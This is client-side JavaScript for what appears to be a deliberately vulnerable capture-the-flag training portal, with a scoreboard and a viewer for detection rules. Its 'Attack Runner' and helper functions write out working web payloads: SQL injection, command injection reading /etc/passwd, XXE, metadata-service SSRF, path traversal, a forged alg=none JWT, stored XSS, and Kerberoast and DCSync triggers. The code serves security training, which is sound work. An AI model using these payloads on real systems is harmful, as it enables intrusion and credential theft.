/* Seven Kingdoms Portal - Client-Side Logic */

// ── State ───────────────────────────────────
let currentUser = null;
let authToken = null;
let capturedFlags = JSON.parse(localStorage.getItem('portal_flags') || '[]');
let requestCount = 0;
let attackCount = 0;

// ── Initialization ──────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Restore session
  const saved = localStorage.getItem('portal_session');
  if (saved) {
    try {
      const session = JSON.parse(saved);
      currentUser = session.user;
      authToken = session.token;
      showApp();
    } catch (e) {
      localStorage.removeItem('portal_session');
    }
  }

  // Tab navigation
  document.querySelectorAll('.topnav nav a').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      const tab = a.dataset.tab;
      if (tab) switchTab(tab);
    });
  });

  // Sub-tab navigation (attack categories)
  document.querySelectorAll('.tab-btn[data-subtab]').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn[data-subtab]').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const subtab = btn.dataset.subtab;
      // Only toggle subtabs within the attacks tab
      document.querySelectorAll('[id^="subtab-"]').forEach(el => el.classList.remove('active'));
      const target = document.getElementById('subtab-' + subtab);
      if (target) target.classList.add('active');
    });
  });

  updateScoreboard();
  updateStats();

  // Enter key on login
  document.getElementById('login-pass')?.addEventListener('keydown', e => {
    if (e.key === 'Enter') doLogin();
  });
});


// ── Authentication ──────────────────────────
async function doLogin() {
  const username = document.getElementById('login-user').value.trim();
  const password = document.getElementById('login-pass').value;
  const domain = document.getElementById('login-domain').value;
  const errEl = document.getElementById('login-error');

  if (!username || !password) {
    errEl.textContent = 'Username and password required';
    errEl.style.display = 'block';
    return;
  }

  try {
    const resp = await fetch('/portal/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password, domain }),
    });
    const data = await resp.json();

    if (resp.ok && data.status === 'success') {
      currentUser = data.user;
      authToken = data.token;
      localStorage.setItem('portal_session', JSON.stringify({ user: data.user, token: data.token }));
      showApp();
    } else {
      errEl.textContent = data.message || 'Login failed';
      errEl.style.display = 'block';
    }
  } catch (e) {
    errEl.textContent = 'Connection error: ' + e.message;
    errEl.style.display = 'block';
  }
}

function doLogout() {
  currentUser = null;
  authToken = null;
  localStorage.removeItem('portal_session');
  document.getElementById('app-view').style.display = 'none';
  document.getElementById('login-view').style.display = 'block';
}

function showApp() {
  document.getElementById('login-view').style.display = 'none';
  document.getElementById('app-view').style.display = 'block';
  document.getElementById('user-badge').textContent =
    currentUser?.full_name || currentUser?.username || 'User';
  updateStats();
}


// ── Tab Switching ───────────────────────────
function switchTab(tab) {
  document.querySelectorAll('.topnav nav a').forEach(a => {
    a.classList.toggle('active', a.dataset.tab === tab);
  });
  document.querySelectorAll('.main-content > .tab-content').forEach(el => {
    el.classList.toggle('active', el.id === 'tab-' + tab);
  });

  // Load GOAD status when switching to GOAD tab
  if (tab === 'goad') checkGoadConnectivity();
  // Load detection rules when switching to detections tab
  if (tab === 'detections') loadDetectionRules();
  // Render encyclopedia on first visit
  if (tab === 'learn' && typeof renderEncyclopedia === 'function') {
    const content = document.getElementById('encyclopedia-content');
    if (content && content.children.length <= 1) renderEncyclopedia();
  }
}


// ── API Calls ───────────────────────────────
async function apiCall(url, opts = {}) {
  const panel = document.getElementById('response-panel');
  const content = document.getElementById('resp-content');
  const statusEl = document.getElementById('resp-status');
  const latencyEl = document.getElementById('resp-latency');

  panel.classList.add('open');
  content.textContent = 'Loading...';
  statusEl.textContent = '';
  latencyEl.textContent = '';

  requestCount++;
  updateStats();

  const headers = { ...(opts.headers || {}) };
  if (authToken && !headers['Authorization']) {
    headers['Authorization'] = 'Bearer ' + authToken;
  }

  const start = performance.now();
  try {
    const resp = await fetch(url, { ...opts, headers });
    const elapsed = Math.round(performance.now() - start);

    // Don't follow redirects in the response display
    const text = await resp.text();
    let formatted;
    try {
      const json = JSON.parse(text);
      formatted = JSON.stringify(json, null, 2);
      checkForFlags(json);
    } catch {
      formatted = text.substring(0, 5000);
    }

    statusEl.textContent = `HTTP ${resp.status}`;
    statusEl.className = 'status-code ' + (resp.ok ? 'ok' : 'err');
    latencyEl.textContent = `${elapsed}ms`;
    // Highlight FLAG{} in response
    content.innerHTML = highlightFlags(formatted);

    const flags = formatted.match(/FLAG\{[A-Z0-9_]+\}/g) || [];
    if (!resp.ok || flags.length > 0) {
      attackCount++;
    }
    addFeedItem('GET', url, resp.status, elapsed, '', flags);
  } catch (e) {
    const elapsed = Math.round(performance.now() - start);
    statusEl.textContent = 'ERROR';
    statusEl.className = 'status-code err';
    latencyEl.textContent = `${elapsed}ms`;
    content.textContent = e.message;
    addFeedItem('GET', url, 0, 0, '', [], e.message);
  }

  updateStats();
}

async function apiCallPost(url, body) {
  const headers = { 'Content-Type': 'application/json' };
  if (authToken) headers['Authorization'] = 'Bearer ' + authToken;

  const panel = document.getElementById('response-panel');
  const content = document.getElementById('resp-content');
  const statusEl = document.getElementById('resp-status');
  const latencyEl = document.getElementById('resp-latency');

  panel.classList.add('open');
  content.textContent = 'Loading...';
  requestCount++;
  updateStats();

  const start = performance.now();
  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(body),
    });
    const elapsed = Math.round(performance.now() - start);
    const text = await resp.text();
    let formatted;
    try {
      const json = JSON.parse(text);
      formatted = JSON.stringify(json, null, 2);
      checkForFlags(json);
    } catch {
      formatted = text.substring(0, 5000);
    }

    statusEl.textContent = `HTTP ${resp.status}`;
    statusEl.className = 'status-code ' + (resp.ok ? 'ok' : 'err');
    latencyEl.textContent = `${elapsed}ms`;
    content.innerHTML = highlightFlags(formatted);

    const flags = formatted.match(/FLAG\{[A-Z0-9_]+\}/g) || [];
    if (!resp.ok || flags.length > 0) {
      attackCount++;
    }
    addFeedItem('POST', url, resp.status, elapsed, '', flags);
  } catch (e) {
    statusEl.textContent = 'ERROR';
    statusEl.className = 'status-code err';
    content.textContent = e.message;
    addFeedItem('POST', url, 0, 0, '', [], e.message);
  }

  updateStats();
}


// ── Flag Highlighting ───────────────────────
function highlightFlags(text) {
  // Escape HTML first, then highlight flags
  const escaped = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  return escaped.replace(/(FLAG\{[A-Z0-9_]+\})/g, '<span class="flag-highlight">$1</span>');
}


// ── Special Actions ─────────────────────────
function sendXSSMessage() {
  apiCallPost('/portal/api/messages/send', {
    from: currentUser?.username || 'anonymous',
    to: 'admin',
    subject: '<script>alert("XSS")</script>',
    body: '<img src=x onerror="alert(document.cookie)"> Stored XSS via raven message',
  });
}

function searchTreasury() {
  const q = document.getElementById('treasury-search').value;
  apiCall('/portal/api/treasury/search?q=' + encodeURIComponent(q));
}

function sendTradeXXE() {
  // XXE payload to read /etc/passwd via trade import
  const xml = '<?xml version="1.0" encoding="UTF-8"?>\n' +
    '<!DOCTYPE trade [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n' +
    '<trade>\n  <from>House Stark</from>\n  <to>House Lannister</to>\n' +
    '  <goods>Valyrian Steel</goods>\n  <quantity>1</quantity>\n' +
    '  <price>15000</price>\n  <notes>&xxe;</notes>\n</trade>';

  const start = performance.now();
  fetch('/portal/api/trade/import', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/xml',
      ...(authToken ? { 'Authorization': 'Bearer ' + authToken } : {}),
    },
    body: xml,
  }).then(async resp => {
    const elapsed = Math.round(performance.now() - start);
    const data = await resp.json();
    showResponse(data, resp.status, elapsed);
  }).catch(e => showResponse({ error: e.message }, 0, 0));
}

function makeNoneJwt() {
  // Create a JWT with algorithm=none and role=superadmin
  const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })).replace(/=/g, '');
  const payload = btoa(JSON.stringify({
    sub: 'attacker',
    role: 'superadmin',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
  })).replace(/=/g, '');
  return header + '.' + payload + '.';
}

async function checkGoadConnectivity() {
  const container = document.getElementById('goad-status');
  container.innerHTML = '<div class="goad-item"><span class="dot checking"></span> Checking...</div>';

  try {
    const resp = await fetch('/portal/api/goad/connectivity');
    const data = await resp.json();
    const items = [];
    for (const [key, info] of Object.entries(data.connectivity || {})) {
      const online = info.status === 'reachable';
      items.push(`
        <div class="goad-item">
          <span class="dot ${online ? 'online' : 'offline'}"></span>
          <span>${key} (${info.host}:${info.port})</span>
        </div>
      `);
    }
    container.innerHTML = items.join('') || '<div class="goad-item">No endpoints found</div>';
  } catch (e) {
    container.innerHTML = '<div class="goad-item"><span class="dot offline"></span> Failed to check: ' + e.message + '</div>';
  }
}


// ── Flag Detection ──────────────────────────
function checkForFlags(obj) {
  const str = JSON.stringify(obj);
  const flagPattern = /FLAG\{[A-Z0-9_]+\}/g;
  const found = str.match(flagPattern) || [];

  for (const flag of found) {
    if (!capturedFlags.includes(flag)) {
      capturedFlags.push(flag);
      localStorage.setItem('portal_flags', JSON.stringify(capturedFlags));
      showToast('Flag captured: ' + flag, 'flag');
    }
  }

  updateScoreboard();
}

function updateScoreboard() {
  const total = 48;  // Total flags available (30 original + 18 marketplace)
  const captured = capturedFlags.length;
  const pct = Math.round((captured / total) * 100);

  const progress = document.getElementById('ctf-progress');
  const score = document.getElementById('ctf-score');
  const flagsCount = document.getElementById('flags-count');
  const flagList = document.getElementById('flag-list');

  if (progress) progress.style.width = pct + '%';
  if (score) score.textContent = captured + ' / ' + total;
  if (flagsCount) flagsCount.textContent = captured;

  if (flagList) {
    flagList.innerHTML = capturedFlags.map(f =>
      `<div style="padding:4px 0;font-family:monospace;color:var(--accent)">${f}</div>`
    ).join('') || '<p style="color:var(--text-muted)">No flags captured yet. Start exploiting vulnerabilities!</p>';
  }
}


// ── UI Helpers ──────────────────────────────
function updateStats() {
  const el = (id) => document.getElementById(id);
  if (el('req-count')) el('req-count').textContent = requestCount;
  if (el('attack-count')) el('attack-count').textContent = attackCount;
}

function closePanel() {
  document.getElementById('response-panel').classList.remove('open');
}

function showToast(message, type = 'success') {
  const container = document.getElementById('toasts');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = 'toast toast-' + type;
  toast.textContent = message;
  container.appendChild(toast);

  setTimeout(() => toast.remove(), 5000);
}


// ── Keyboard shortcut: Escape to close panel ──
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') closePanel();
});


// ═════════════════════════════════════════════════
// ATTACK RUNNER
// ═════════════════════════════════════════════════
const ATTACK_SEQUENCE = [
  { method: 'GET',  url: "/portal/api/treasury/search?q='%20UNION%20SELECT%20*%20FROM%20secrets--", name: "SQL Injection" },
  { method: 'GET',  url: "/portal/api/command/exec?cmd=id;whoami;cat%20/etc/passwd", name: "Command Injection" },
  { method: 'GET',  url: "/portal/api/avatar/fetch?url=http://169.254.169.254/opc/v2/instance/", name: "SSRF - IMDS" },
  { method: 'GET',  url: "/portal/api/files/download?path=../../../etc/passwd", name: "Path Traversal" },
  { method: 'GET',  url: "/portal/api/files/download?path=../.env.local", name: "Path Traversal - Config" },
  { method: 'GET',  url: "/portal/api/files/list?dir=../../", name: "Directory Listing" },
  { method: 'GET',  url: "/portal/api/template/render?tpl={{7*7}}%20{{__class__.__mro__}}&name=test", name: "SSTI" },
  { method: 'GET',  url: "/portal/api/ldap/lookup?username=*&domain=sevenkingdoms.local", name: "LDAP Injection" },
  { method: 'GET',  url: "/portal/api/users/2", name: "IDOR - User Profile" },
  { method: 'GET',  url: "/portal/api/users?debug=true", name: "Credential Dump" },
  { method: 'GET',  url: "/portal/api/treasury/1003", name: "IDOR - Treasury" },
  { method: 'GET',  url: "/portal/api/messages", name: "IDOR - Messages" },
  { method: 'GET',  url: "/portal/api/messages/3", name: "Admin Creds Message" },
  { method: 'GET',  url: "/portal/api/debug/crypto", name: "Crypto Config Leak" },
  { method: 'GET',  url: "/portal/api/debug/env", name: "Environment Leak" },
  { method: 'GET',  url: "/portal/api/admin/panel", name: "JWT None Bypass", makeAuth: () => 'Bearer ' + makeNoneJwt() },
  { method: 'GET',  url: "/portal/api/auth/session-fixation?session_id=attacker-controlled-123", name: "Session Fixation" },
  { method: 'GET',  url: "/portal/api/password-reset?username=admin", name: "Predictable Reset" },
  { method: 'GET',  url: "/portal/api/redirect?url=https://evil.example.com/phishing", name: "Open Redirect" },
  { method: 'GET',  url: "/portal/api/goad/kerberoast", name: "Kerberoasting" },
  { method: 'GET',  url: "/portal/api/goad/dcsync?target=Administrator", name: "DCSync" },
  { method: 'GET',  url: "/portal/api/goad/dcsync?target=krbtgt", name: "Golden Ticket" },
  { method: 'GET',  url: "/portal/api/silent/transfer?from_account=Crown&to_account=IronBank&amount=999999", name: "Silent Transfer" },
  { method: 'GET',  url: "/portal/api/log-injection?msg=INFO%20Login%20successful%20user%3Dadmin%0aWARNING%20Access%20granted", name: "Log Injection" },
  { method: 'GET',  url: "/portal/api/avatar/fetch?url=http://10.0.1.37:8080/health", name: "SSRF - Internal" },
  { method: 'POST', url: "/portal/api/auth/login", body: { username: "admin", password: "admin" }, name: "Default Creds" },
  { method: 'POST', url: "/portal/api/auth/register", body: { username: "hacker_" + Date.now(), password: "test", role: "superadmin" }, name: "Mass Assignment" },
  { method: 'POST', url: "/portal/api/treasury/transfer", body: { from: "Lannister", to: "Stark", amount: -50000 }, name: "Negative Transfer" },
  { method: 'POST', url: "/portal/api/messages/send", body: { from: "attacker", to: "admin", subject: '<script>alert("XSS")</script>', body: '<img src=x onerror="alert(1)">' }, name: "Stored XSS" },
  { method: 'POST', url: "/portal/api/webhook/send", body: { url: "http://192.168.56.10:389", data: { test: true } }, name: "Webhook SSRF" },
  // Enhanced Marketplace (Juice Shop-inspired)
  { method: 'POST', url: "/portal/api/shop/reviews/1", body: { author: "cersei.lannister", rating: 1, comment: '<script>alert("XSS")</script>' }, name: "Stored XSS Review" },
  { method: 'GET',  url: "/portal/api/shop/coupons/encode-sample", name: "Coupon Encoding Leak" },
  { method: 'POST', url: "/portal/api/shop/coupon/apply", body: { encoded: btoa("SKPCOUPON|FORGED100|100|2099-12-31") }, name: "Forged Coupon" },
  { method: 'POST', url: "/portal/api/shop/coupon/apply", body: { code: "VALAR50" }, name: "Expired Coupon" },
  { method: 'GET',  url: "/portal/api/wallet/balance?username=cersei.lannister", name: "Wallet IDOR" },
  { method: 'POST', url: "/portal/api/wallet/transfer", body: { from: "cersei.lannister", to: "hacker", amount: -50000 }, name: "Negative Gold Transfer" },
  { method: 'POST', url: "/portal/api/shop/purchase-enhanced", body: { item_id: 1, quantity: -5, username: "hacker" }, name: "Negative Quantity" },
  { method: 'POST', url: "/portal/api/shop/purchase-enhanced", body: { item_id: 1, quantity: 1, price: 1, username: "hacker" }, name: "Price Tampering" },
  { method: 'POST', url: "/portal/api/users/change-allegiance", body: { username: "jon.snow", house: "House Lannister" }, name: "CSRF Allegiance" },
  { method: 'GET',  url: "/portal/api/auth/security-question?username=jon.snow", name: "Security Question Leak" },
  { method: 'POST', url: "/portal/api/auth/reset-password-security", body: { username: "jon.snow", answer: "ghost", new_password: "hacked123" }, name: "OSINT Password Reset" },
  { method: 'POST', url: "/portal/api/auth/register-enhanced", body: { username: "hacker_" + Date.now(), password: "test", role: "admin" }, name: "Hidden Admin Role" },
  { method: 'POST', url: "/portal/api/feedback", body: { comment: "Automated feedback", rating: 1, author: "bot" }, name: "CAPTCHA Bypass" },
  { method: 'POST', url: "/portal/api/config/update", body: { __proto__: { isAdmin: true } }, name: "Prototype Pollution" },
  { method: 'GET',  url: "/portal/api/score-board", name: "Score Board Discovery" },
  { method: 'GET',  url: "/portal/api/shop/deleted-products", name: "Deleted Products" },
  { method: 'GET',  url: "/portal/api/admin/panel", name: "Admin Panel (No Auth)" },
];

let runnerActive = false;
let runnerAbort = false;

async function runAllAttacks() {
  if (runnerActive) return;
  runnerActive = true;
  runnerAbort = false;

  const btn = document.getElementById('run-all-btn');
  const stopBtn = document.getElementById('run-stop-btn');
  const status = document.getElementById('runner-status');
  const progressBar = document.getElementById('runner-progress');
  const fill = document.getElementById('runner-fill');
  const counter = document.getElementById('runner-counter');

  btn.disabled = true;
  btn.style.opacity = '0.5';
  stopBtn.style.display = 'inline-block';
  progressBar.style.display = 'flex';
  status.textContent = 'Running...';
  status.className = 'runner-status running';

  const total = ATTACK_SEQUENCE.length;
  let completed = 0;
  let flagsFound = 0;

  for (const attack of ATTACK_SEQUENCE) {
    if (runnerAbort) break;

    counter.textContent = `${completed} / ${total}`;
    fill.style.width = Math.round((completed / total) * 100) + '%';

    try {
      const headers = { 'Content-Type': 'application/json' };
      if (authToken) headers['Authorization'] = 'Bearer ' + authToken;
      if (attack.makeAuth) headers['Authorization'] = attack.makeAuth();

      const opts = { method: attack.method, headers };
      if (attack.body) opts.body = JSON.stringify(attack.body);

      const start = performance.now();
      const resp = await fetch(attack.url, opts);
      const elapsed = Math.round(performance.now() - start);
      const text = await resp.text();

      let flags = [];
      try {
        const json = JSON.parse(text);
        checkForFlags(json);
        const matches = text.match(/FLAG\{[A-Z0-9_]+\}/g);
        if (matches) flags = matches;
      } catch {}

      flagsFound += flags.length;
      addFeedItem(attack.method, attack.url, resp.status, elapsed, attack.name, flags);

      requestCount++;
      if (!resp.ok || flags.length > 0) attackCount++;
    } catch (e) {
      addFeedItem(attack.method, attack.url, 0, 0, attack.name, [], e.message);
    }

    completed++;
    updateStats();

    // Small delay between attacks to avoid overwhelming the server
    await new Promise(r => setTimeout(r, 150));
  }

  fill.style.width = '100%';
  counter.textContent = `${completed} / ${total}`;
  status.textContent = `Done! ${completed} attacks, ${flagsFound} flags captured`;
  status.className = 'runner-status done';
  btn.disabled = false;
  btn.style.opacity = '1';
  stopBtn.style.display = 'none';
  runnerActive = false;
  updateScoreboard();
}

function stopAttackRunner() {
  runnerAbort = true;
  const status = document.getElementById('runner-status');
  status.textContent = 'Stopping...';
}


// ═════════════════════════════════════════════════
// ACTIVITY FEED
// ═════════════════════════════════════════════════
let feedItems = [];

function addFeedItem(method, url, status, latency, name, flags, error) {
  const feed = document.getElementById('activity-feed');
  if (!feed) return;

  // Remove empty placeholder
  const empty = feed.querySelector('.feed-empty');
  if (empty) empty.remove();

  const item = document.createElement('div');
  item.className = 'feed-item';

  const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const statusClass = status >= 200 && status < 400 ? 'ok' : 'err';
  const shortUrl = url.replace('/portal/api/', '/').split('?')[0];

  let html = `
    <span class="feed-time">${time}</span>
    <span class="feed-method ${method.toLowerCase()}">${method}</span>
    <span class="feed-url" title="${url}">${name || shortUrl}</span>
    <span class="feed-status ${statusClass}">${status || 'ERR'}</span>
  `;

  if (flags && flags.length > 0) {
    html += `<span class="feed-flag">${flags.length} FLAG${flags.length > 1 ? 'S' : ''}</span>`;
  }

  item.innerHTML = html;

  // Prepend (newest first)
  feed.insertBefore(item, feed.firstChild);

  // Limit feed items
  feedItems.push(item);
  if (feedItems.length > 100) {
    const old = feedItems.shift();
    old.remove();
  }

  // Update counter
  const counter = document.getElementById('feed-count');
  if (counter) counter.textContent = `${feedItems.length} events`;
}

function clearActivityFeed() {
  const feed = document.getElementById('activity-feed');
  if (feed) {
    feed.innerHTML = '<div class="feed-empty">No activity yet. Click attack cards or run the Attack Runner to generate security events.</div>';
    feedItems = [];
    const counter = document.getElementById('feed-count');
    if (counter) counter.textContent = '0 events';
  }
}


// ═════════════════════════════════════════════════
// DETECTION RULES VIEWER
// ═════════════════════════════════════════════════
let cachedRules = null;

async function loadDetectionRules() {
  const grid = document.getElementById('detection-rules-grid');
  const countEl = document.getElementById('detection-rule-count');
  if (!grid) return;

  const severity = document.getElementById('det-filter-severity')?.value || '';
  const mitre = document.getElementById('det-filter-mitre')?.value || '';
  const owasp = document.getElementById('det-filter-owasp')?.value || '';

  let params = [];
  if (severity) params.push('severity=' + encodeURIComponent(severity));
  if (mitre) params.push('mitre_tactic=' + encodeURIComponent(mitre));
  if (owasp) params.push('owasp=' + encodeURIComponent(owasp));

  const url = '/portal/api/detection-rules' + (params.length ? '?' + params.join('&') : '');

  try {
    const resp = await fetch(url);
    const data = await resp.json();
    const rules = data.rules || [];

    if (countEl) countEl.textContent = `${rules.length} rules`;

    if (rules.length === 0) {
      grid.innerHTML = '<div style="color:var(--text-muted);padding:20px;text-align:center">No rules match the current filters.</div>';
      return;
    }

    // Store rules globally so onclick can reference by index (avoids HTML escaping issues)
    window._detRules = rules;

    grid.innerHTML = rules.map((rule, idx) => `
      <div class="detection-rule">
        <div class="rule-header">
          <span class="rule-id">${rule.id}</span>
          <span class="rule-name">${rule.name}</span>
          <span class="badge badge-${rule.severity === 'critical' ? 'critical' : rule.severity === 'high' ? 'high' : 'medium'}">${rule.severity}</span>
        </div>
        <div class="rule-desc">${rule.description}</div>
        <div class="rule-queries">
          <button class="query-copy-btn" onclick="copyQuery(this, window._detRules[${idx}].apm_query)">
            Copy APM Query
          </button>
          <button class="query-copy-btn" onclick="copyQuery(this, window._detRules[${idx}].la_query)">
            Copy LA Query
          </button>
        </div>
        <div class="rule-meta">
          <span class="badge badge-mitre">${rule.mitre_id}</span>
          <span class="badge badge-mitre">${rule.mitre_tactic}</span>
          ${[].concat(rule.owasp || []).map(o => `<span class="badge badge-owasp">${o}</span>`).join('')}
        </div>
        <div class="rule-endpoints">
          Endpoints: ${(rule.portal_endpoints || []).map(e => `<code>${e}</code>`).join(' ')}
        </div>
      </div>
    `).join('');

  } catch (e) {
    grid.innerHTML = `<div style="color:var(--error);padding:20px">Failed to load rules: ${e.message}</div>`;
  }
}

// ── Encyclopedia Search Filter ──────────────
function filterEncyclopedia(query) {
  const q = query.toLowerCase().trim();
  document.querySelectorAll('.enc-category').forEach(cat => {
    const attacks = cat.querySelectorAll('.enc-attack');
    let anyVisible = false;
    attacks.forEach(atk => {
      const text = atk.textContent.toLowerCase();
      const match = !q || text.includes(q);
      atk.style.display = match ? '' : 'none';
      if (match) anyVisible = true;
    });
    cat.style.display = anyVisible || !q ? '' : 'none';
    // Auto-expand categories with matches when searching
    if (q && anyVisible) {
      const attacksContainer = cat.querySelector('.enc-attacks');
      if (attacksContainer) attacksContainer.style.display = 'block';
    }
  });
}


function copyQuery(btn, query) {
  navigator.clipboard.writeText(query).then(() => {
    btn.classList.add('copied');
    const orig = btn.textContent;
    btn.textContent = 'Copied!';
    setTimeout(() => {
      btn.classList.remove('copied');
      btn.textContent = orig;
    }, 2000);
  }).catch(() => {
    // Fallback
    const ta = document.createElement('textarea');
    ta.value = query;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
    btn.textContent = 'Copied!';
    setTimeout(() => { btn.textContent = btn.dataset.orig || 'Copy'; }, 2000);
  });
}
